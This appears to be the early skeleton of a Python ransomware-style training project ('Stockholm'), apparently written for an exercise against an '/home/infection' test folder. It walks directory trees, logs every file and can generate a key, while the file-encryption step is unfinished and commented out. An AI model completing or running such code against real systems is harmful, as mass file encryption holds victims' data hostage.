import os
from args import optparsing
from logger import log_info, log_title
from crypto import generate_key, encrypt

def find_all_files(path: str, action) -> None:
    for root, dirs, files in os.walk(path, topdown=False):
        log_title('Root:' + root)
        for name in files:
            log_info(os.path.join(root, name))
            action()

def encrypt_all(path: str, pub_key_filename):
    for root, dirs, files in os.walk(path, topdown=False):
        log_title('Root:' + root)
        for name in files:
            filename = os.path.join(root, name)
            log_info(filename)

def main():
    args = optparsing()
    os.environ['STOCKHOLM_IS_SILENT'] = str(args.silent)
    if args.key:
        generate_key()
    # encrypt('/home/infection/test.txt')

if __name__ == '__main__':
    main()